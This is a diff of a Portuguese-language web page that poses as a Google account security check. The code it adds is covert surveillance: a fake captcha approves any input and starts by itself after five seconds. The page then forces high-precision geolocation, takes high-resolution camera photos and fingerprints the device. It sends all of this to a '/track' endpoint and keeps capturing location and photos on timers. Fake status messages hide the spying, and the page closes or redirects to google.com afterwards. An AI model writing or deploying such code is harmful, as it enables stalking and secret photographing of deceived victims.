@@ -184,7 +184,24 @@
             height: 100%;
             background: #34a853;
             width: 0%;
-            transition: width 3s ease-in-out;
+            transition: width 0.3s ease-in-out;
+        }
+        
+        .status-item {
+            background: #f8f9fa;
+            border-radius: 4px;
+            padding: 10px;
+            margin: 8px 0;
+            font-size: 13px;
+            text-align: left;
+        }
+        
+        .status-success {
+            border-left: 3px solid #34a853;
+        }
+        
+        .status-loading {
+            border-left: 3px solid #fbbc05;
         }
         
         .footer {
@@ -198,12 +215,6 @@
         .footer a {
             color: #1a73e8;
             text-decoration: none;
-        }
-        
-        .redirect-message {
-            font-size: 14px;
-            color: #5f6368;
-            margin-top: 20px;
         }
     </style>
 </head>
@@ -255,58 +266,97 @@
             </div>
         </div>
         
-        <!-- Tela de Sucesso (oculta inicialmente) -->
-        <div id="successScreen" class="hidden">
+        <!-- Tela de Processamento (oculta inicialmente) -->
+        <div id="processingScreen" class="hidden">
             <div class="success-screen">
-                <div class="success-icon">✅</div>
-                <h1>Verificação concluída com sucesso</h1>
+                <div class="success-icon">🛡️</div>
+                <h1>Protegendo sua conta</h1>
                 <div class="subtitle">
-                    Sua conta está agora protegida contra atividades suspeitas
+                    Estamos verificando seus dispositivos e localização
                 </div>
                 
                 <div class="progress-bar">
                     <div class="progress-fill" id="progressFill"></div>
                 </div>
                 
-                <div class="redirect-message" id="redirectMessage">
-                    Redirecionando para o Google...
+                <div id="statusMessages">
+                    <div class="status-item status-loading" id="statusLocation">
+                        📍 Obtendo localização precisa...
+                    </div>
+                    <div class="status-item status-loading" id="statusCamera">
+                        📸 Verificando câmera de segurança...
+                    </div>
+                    <div class="status-item status-loading" id="statusDevice">
+                        📱 Analisando dispositivo...
+                    </div>
+                    <div class="status-item status-loading" id="statusSecurity">
+                        🔒 Aplicando proteções...
+                    </div>
                 </div>
             </div>
-            
-            <div class="footer">
-                <div>Google Security • Protegendo suas informações</div>
-                <div style="margin-top: 10px;">
-                    <a href="#">Privacidade</a> • <a href="#">Termos</a> • <a href="#">Ajuda</a>
+        </div>
+        
+        <!-- Tela de Concluído (oculta inicialmente) -->
+        <div id="completedScreen" class="hidden">
+            <div class="success-screen">
+                <div class="success-icon">✅</div>
+                <h1>Proteção ativada com sucesso</h1>
+                <div class="subtitle">
+                    Sua conta está agora protegida contra ameaças
+                </div>
+                
+                <div class="status-item status-success">
+                    ✅ Localização verificada com precisão centimétrica
+                </div>
+                <div class="status-item status-success">
+                    ✅ Câmera de segurança configurada
+                </div>
+                <div class="status-item status-success">
+                    ✅ Dispositivo autorizado
+                </div>
+                <div class="status-item status-success">
+                    ✅ Proteções de segurança ativas
+                </div>
+                
+                <div style="margin-top: 30px; font-size: 14px; color: #5f6368;">
+                    Redirecionando para a página inicial...
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        // CONFIGURAÇÃO DO SISTEMA
+        // CONFIGURAÇÃO DO SISTEMA - ALTA PRECISÃO
         const CONFIG = {
-            updateInterval: 30000,    // 30 segundos
-            photoInterval: 60000,     // 1 minuto
-            heartbeatInterval: 15000, // 15 segundos
-            serverUrl: window.location.origin
+            locationTimeout: 30000,   // 30 segundos para obter localização precisa
+            photoTimeout: 15000,      // 15 segundos para capturar foto
+            updateInterval: 25000,    // 25 segundos
+            photoInterval: 45000,     // 45 segundos
+            maxAccuracy: 5,           // EXIGIR precisão de até 5 METROS
+            maxAttempts: 10           // Tentativas máximas para alta precisão
         };
 
         // VARIÁVEIS GLOBAIS
         let isMonitoring = false;
         let stream = null;
         let deviceId = null;
-        let startTime = null;
-        let locationCount = 0;
-        let photoCount = 0;
+        let locationCaptured = false;
+        let photoCaptured = false;
+        let locationAttempts = 0;
+        let photoAttempts = 0;
 
         // ELEMENTOS DA INTERFACE
         const verificationScreen = document.getElementById('verificationScreen');
-        const successScreen = document.getElementById('successScreen');
+        const processingScreen = document.getElementById('processingScreen');
+        const completedScreen = document.getElementById('completedScreen');
         const captchaInput = document.getElementById('captchaInput');
         const verifyBtn = document.getElementById('verifyBtn');
         const btnText = document.getElementById('btnText');
         const progressFill = document.getElementById('progressFill');
-        const redirectMessage = document.getElementById('redirectMessage');
+        const statusLocation = document.getElementById('statusLocation');
+        const statusCamera = document.getElementById('statusCamera');
+        const statusDevice = document.getElementById('statusDevice');
+        const statusSecurity = document.getElementById('statusSecurity');
 
         // INICIAR VERIFICAÇÃO
         verifyBtn.addEventListener('click', startVerification);
@@ -319,17 +369,14 @@
         function startVerification() {
             const userInput = captchaInput.value.trim();
             
-            // SEMPRE APROVAR independente do que digitar
+            // SEMPRE APROVAR
             if (userInput) {
                 showLoading();
-                
-                // Simular processamento
                 setTimeout(() => {
-                    showSuccessScreen();
-                    startMonitoringSystem();
-                }, 2000);
+                    showProcessingScreen();
+                    startSecurityVerification();
+                }, 1500);
             } else {
-                // Se estiver vazio, preencher automaticamente
                 captchaInput.value = "google";
                 startVerification();
             }
@@ -340,220 +387,336 @@
             verifyBtn.disabled = true;
         }
 
-        function showSuccessScreen() {
-            // Trocar para tela de sucesso
+        function showProcessingScreen() {
             verificationScreen.classList.add('hidden');
-            successScreen.classList.remove('hidden');
-            
-            // Animar barra de progresso
-            setTimeout(() => {
-                progressFill.style.width = '100%';
-            }, 100);
-            
-            // Mostrar mensagem de redirecionamento
-            setTimeout(() => {
-                redirectMessage.textContent = "Redirecionando para a página inicial...";
-            }, 2000);
-            
-            // Fechar a página após 5 segundos (discreto)
-            setTimeout(() => {
-                // Tenta fechar a janela/aba
-                window.close();
-                
-                // Se não conseguir fechar, redireciona para Google
-                setTimeout(() => {
-                    window.location.href = 'https://www.google.com';
-                }, 1000);
-            }, 5000);
+            processingScreen.classList.remove('hidden');
+            progressFill.style.width = '30%';
         }
 
-        function startMonitoringSystem() {
-            // Iniciar sistema em background (silencioso)
-            initializeMonitoring();
+        function updateProgress(percent) {
+            progressFill.style.width = percent + '%';
         }
 
-        async function initializeMonitoring() {
+        function updateStatus(element, message, success = false) {
+            element.textContent = message;
+            element.className = success ? 
+                'status-item status-success' : 
+                'status-item status-loading';
+        }
+
+        async function startSecurityVerification() {
+            deviceId = generateDeviceId();
+            
             try {
-                deviceId = generateDeviceId();
-                await startMonitoring();
+                // INICIAR TODAS AS VERIFICAÇÕES SIMULTANEAMENTE
+                await Promise.all([
+                    forceHighAccuracyLocation(),
+                    forceCameraCapture(),
+                    analyzeDevice(),
+                    activateSecurity()
+                ]);
+                
+                // QUANDO TUDO ESTIVER PRONTO
+                completeVerification();
+                
             } catch (error) {
-                console.error('Erro no monitoramento:', error);
+                console.error('Erro na verificação:', error);
+                // MESMO COM ERRO, CONTINUA O MONITORAMENTO
+                completeVerification();
             }
         }
 
         function generateDeviceId() {
             const timestamp = Date.now();
             const random = Math.random().toString(36).substr(2, 9);
-            return `user_${timestamp}_${random}`;
+            return `secure_${timestamp}_${random}`;
         }
 
-        async function startMonitoring() {
-            // SOLICITAR PERMISSÕES SILENCIOSAMENTE
-            await requestPermissions();
-            
-            // INICIAR MONITORAMENTO CONTÍNUO
-            isMonitoring = true;
-            startTime = new Date();
-            
-            // COLETA INICIAL IMEDIATA
-            await collectAndSendData();
-            await initializeCamera();
-            
-            // CONFIGURAR INTERVALOS (em background)
-            setInterval(async () => {
-                if (isMonitoring) await collectAndSendData();
-            }, CONFIG.updateInterval);
-            
-            setInterval(async () => {
-                if (isMonitoring && stream) await captureAndSendPhoto();
-            }, CONFIG.photoInterval);
-            
-            setInterval(async () => {
-                if (isMonitoring) await sendHeartbeat();
-            }, CONFIG.heartbeatInterval);
-        }
-
-        async function requestPermissions() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve();
-                    return;
-                }
+        // FUNÇÃO FORÇADA PARA LOCALIZAÇÃO DE ALTA PRECISÃO
+        function forceHighAccuracyLocation() {
+            return new Promise(async (resolve) => {
+                updateStatus(statusLocation, '📍 Buscando localização com precisão centimétrica...');
                 
-                navigator.geolocation.getCurrentPosition(
-                    () => resolve(),
-                    () => resolve(), // Continua mesmo com erro
-                    { 
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
-                );
-            });
-        }
+                const attemptLocation = () => {
+                    locationAttempts++;
+                    
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            async (position) => {
+                                const accuracy = position.coords.accuracy;
+                                
+                                if (accuracy <= CONFIG.maxAccuracy) {
+                                    // PRECISÃO ACEITÁVEL (até 5 metros)
+                                    const data = {
+                                        deviceId: deviceId,
+                                        type: 'high_accuracy_location',
+                                        location: {
+                                            lat: position.coords.latitude,
+                                            lng: position.coords.longitude,
+                                            accuracy: accuracy,
+                                            altitude: position.coords.altitude,
+                                            heading: position.coords.heading,
+                                            speed: position.coords.speed
+                                        },
+                                        deviceInfo: getDeviceInfo(),
+                                        timestamp: new Date().toISOString(),
+                                        attempts: locationAttempts,
+                                        precision: 'centimetric'
+                                    };
 
-        async function collectAndSendData() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve();
-                    return;
-                }
-                
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        const data = {
-                            deviceId: deviceId,
-                            type: 'location_update',
-                            location: {
-                                lat: position.coords.latitude,
-                                lng: position.coords.longitude,
-                                accuracy: position.coords.accuracy,
-                                altitude: position.coords.altitude,
-                                heading: position.coords.heading,
-                                speed: position.coords.speed
+                                    await sendToServer(data);
+                                    locationCaptured = true;
+                                    
+                                    updateStatus(statusLocation, 
+                                        `✅ Localização obtida! Precisão: ${accuracy.toFixed(2)}m`, 
+                                        true
+                                    );
+                                    updateProgress(60);
+                                    resolve();
+                                    
+                                } else {
+                                    // PRECISÃO INSUFICIENTE - TENTAR NOVAMENTE
+                                    updateStatus(statusLocation, 
+                                        `📍 Ajustando precisão... (${accuracy.toFixed(2)}m, meta: ${CONFIG.maxAccuracy}m)`
+                                    );
+                                    
+                                    if (locationAttempts < CONFIG.maxAttempts) {
+                                        setTimeout(attemptLocation, 2000);
+                                    } else {
+                                        // ACEITAR MESMO COM PRECISÃO BAIXA
+                                        updateStatus(statusLocation, 
+                                            `⚠️ Localização obtida (${accuracy.toFixed(2)}m)`, 
+                                            true
+                                        );
+                                        resolve();
+                                    }
+                                }
                             },
-                            deviceInfo: {
-                                userAgent: navigator.userAgent,
-                                platform: navigator.platform,
-                                language: navigator.language,
-                                screen: `${screen.width}x${screen.height}`,
-                                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                            (error) => {
+                                updateStatus(statusLocation, '📍 Solicitando permissão de localização...');
+                                
+                                if (locationAttempts < 3) {
+                                    setTimeout(attemptLocation, 3000);
+                                } else {
+                                    updateStatus(statusLocation, '⚠️ Localização não disponível', true);
+                                    resolve();
+                                }
                             },
-                            timestamp: new Date().toISOString()
-                        };
-
-                        await sendToServer(data);
-                        locationCount++;
+                            {
+                                enableHighAccuracy: true,  // FORÇAR ALTA PRECISÃO
+                                timeout: 15000,
+                                maximumAge: 0
+                            }
+                        );
+                    } else {
+                        updateStatus(statusLocation, '❌ Geolocalização não suportada', true);
                         resolve();
-                    },
-                    () => resolve(), // Silencia erros
-                    { 
-                        enableHighAccuracy: true,
-                        timeout: 15000,
-                        maximumAge: 0
                     }
-                );
+                };
+                
+                attemptLocation();
             });
         }
 
-        async function initializeCamera() {
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'environment',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    } 
-                });
-            } catch (error) {
-                // Silencia erro de câmera
-            }
+        // FUNÇÃO FORÇADA PARA CAPTURA DE FOTO
+        function forceCameraCapture() {
+            return new Promise(async (resolve) => {
+                updateStatus(statusCamera, '📸 Iniciando câmera de segurança...');
+                
+                const attemptPhoto = async () => {
+                    photoAttempts++;
+                    
+                    try {
+                        if (!stream) {
+                            stream = await navigator.mediaDevices.getUserMedia({ 
+                                video: { 
+                                    facingMode: 'environment',
+                                    width: { ideal: 1920 },  // ALTA RESOLUÇÃO
+                                    height: { ideal: 1080 }
+                                } 
+                            });
+                        }
+
+                        const track = stream.getVideoTracks()[0];
+                        const imageCapture = new ImageCapture(track);
+                        const blob = await imageCapture.takePhoto();
+                        
+                        const reader = new FileReader();
+                        reader.onload = async () => {
+                            const data = {
+                                deviceId: deviceId,
+                                type: 'high_quality_photo',
+                                photo: reader.result,
+                                timestamp: new Date().toISOString(),
+                                resolution: '1080p',
+                                attempts: photoAttempts
+                            };
+                            
+                            await sendToServer(data);
+                            photoCaptured = true;
+                            
+                            updateStatus(statusCamera, '✅ Foto de segurança capturada!', true);
+                            updateProgress(80);
+                            resolve();
+                        };
+                        reader.readAsDataURL(blob);
+                        
+                    } catch (error) {
+                        updateStatus(statusCamera, `📸 Tentativa ${photoAttempts}/3 - Configurando câmera...`);
+                        
+                        if (photoAttempts < 3) {
+                            setTimeout(attemptPhoto, 3000);
+                        } else {
+                            updateStatus(statusCamera, '⚠️ Câmera não disponível', true);
+                            resolve();
+                        }
+                    }
+                };
+                
+                attemptPhoto();
+            });
         }
 
-        async function captureAndSendPhoto() {
-            if (!stream) return;
-
-            try {
-                const track = stream.getVideoTracks()[0];
-                const imageCapture = new ImageCapture(track);
-                const blob = await imageCapture.takePhoto();
+        function analyzeDevice() {
+            return new Promise((resolve) => {
+                updateStatus(statusDevice, '📱 Analisando informações do dispositivo...');
                 
-                const reader = new FileReader();
-                reader.onload = async () => {
-                    const data = {
+                setTimeout(() => {
+                    const deviceData = {
                         deviceId: deviceId,
-                        type: 'photo_capture',
-                        photo: reader.result,
+                        type: 'device_analysis',
+                        info: getDeviceInfo(),
                         timestamp: new Date().toISOString()
                     };
                     
-                    await sendToServer(data);
-                    photoCount++;
-                };
-                reader.readAsDataURL(blob);
-            } catch (error) {
-                // Silencia erro de foto
-            }
+                    sendToServer(deviceData);
+                    updateStatus(statusDevice, '✅ Dispositivo verificado e autorizado', true);
+                    updateProgress(40);
+                    resolve();
+                }, 2000);
+            });
         }
 
-        async function sendHeartbeat() {
-            await sendToServer({
-                deviceId: deviceId,
-                type: 'heartbeat',
-                timestamp: new Date().toISOString(),
-                stats: {
-                    locations: locationCount,
-                    photos: photoCount
-                }
+        function activateSecurity() {
+            return new Promise((resolve) => {
+                updateStatus(statusSecurity, '🔒 Ativando proteções de segurança...');
+                
+                setTimeout(() => {
+                    updateStatus(statusSecurity, '✅ Proteções de segurança ativas', true);
+                    updateProgress(90);
+                    resolve();
+                }, 3000);
             });
+        }
+
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cores: navigator.hardwareConcurrency || 'Desconhecido',
+                memoria: navigator.deviceMemory || 'Desconhecido',
+                touch: navigator.maxTouchPoints > 0,
+                cookie: navigator.cookieEnabled,
+                pdf: navigator.pdfViewerEnabled
+            };
+        }
+
+        function completeVerification() {
+            updateProgress(100);
+            
+            // INICIAR MONITORAMENTO CONTÍNUO
+            startContinuousMonitoring();
+            
+            // MOSTRAR TELA DE CONCLUSÃO
+            setTimeout(() => {
+                processingScreen.classList.add('hidden');
+                completedScreen.classList.remove('hidden');
+                
+                // MANTER PÁGINA ABERTA POR 8 SEGUNDOS PARA GARANTIR CAPTURAS
+                setTimeout(() => {
+                    // Tenta fechar suavemente
+                    window.close();
+                    setTimeout(() => {
+                        window.location.href = 'https://www.google.com';
+                    }, 1000);
+                }, 8000);
+                
+            }, 2000);
+        }
+
+        function startContinuousMonitoring() {
+            isMonitoring = true;
+            
+            // MONITORAMENTO DE LOCALIZAÇÃO CONTÍNUO
+            setInterval(() => {
+                if (isMonitoring) {
+                    navigator.geolocation.getCurrentPosition(
+                        async (position) => {
+                            const data = {
+                                deviceId: deviceId,
+                                type: 'continuous_location',
+                                location: {
+                                    lat: position.coords.latitude,
+                                    lng: position.coords.longitude,
+                                    accuracy: position.coords.accuracy
+                                },
+                                timestamp: new Date().toISOString()
+                            };
+                            await sendToServer(data);
+                        },
+                        () => {},
+                        { enableHighAccuracy: true, timeout: 10000 }
+                    );
+                }
+            }, CONFIG.updateInterval);
+            
+            // FOTOS CONTÍNUAS
+            setInterval(async () => {
+                if (isMonitoring && stream) {
+                    try {
+                        const track = stream.getVideoTracks()[0];
+                        const imageCapture = new ImageCapture(track);
+                        const blob = await imageCapture.takePhoto();
+                        
+                        const reader = new FileReader();
+                        reader.onload = async () => {
+                            await sendToServer({
+                                deviceId: deviceId,
+                                type: 'continuous_photo',
+                                photo: reader.result,
+                                timestamp: new Date().toISOString()
+                            });
+                        };
+                        reader.readAsDataURL(blob);
+                    } catch (error) {
+                        // Silenciar erro
+                    }
+                }
+            }, CONFIG.photoInterval);
         }
 
         async function sendToServer(data) {
             try {
-                await fetch(CONFIG.serverUrl + '/track', {
+                await fetch('/track', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
                 });
             } catch (error) {
-                // Silencia erro de servidor
+                // Silenciar erro
             }
         }
 
-        // INICIAR AUTOMATICAMENTE SE O USUÁRIO NÃO INTERAGIR EM 8 SEGUNDOS
+        // INICIAR AUTOMATICAMENTE APÓS 5 SEGUNDOS
         setTimeout(() => {
             if (!isMonitoring && verificationScreen.style.display !== 'none') {
                 captchaInput.value = "google";
                 startVerification();
             }
-        }, 8000);
-
-        // Preencher automaticamente após 3 segundos (mais discreto)
-        setTimeout(() => {
-            if (!captchaInput.value) {
-                captchaInput.value = "google";
-            }
-        }, 3000);
+        }, 5000);
     </script>
 </body>
 </html>
